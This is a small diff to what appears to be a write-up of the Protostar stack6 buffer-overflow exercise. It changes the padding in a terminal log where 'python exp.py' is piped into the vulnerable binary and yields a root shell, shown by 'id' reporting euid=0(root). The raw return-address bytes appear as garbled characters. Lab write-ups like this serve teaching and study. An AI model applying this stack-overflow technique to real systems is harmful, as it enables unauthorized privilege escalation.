@@ -170,7 +170,7 @@ Done!
 
 ```
 root@protostar:/opt/protostar/bin$ (python exp.py; cat) | ./stack6
-input path please: got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP���RRRRSSSSTTTT����`췿c��
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����`췿c��
 id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 whoami
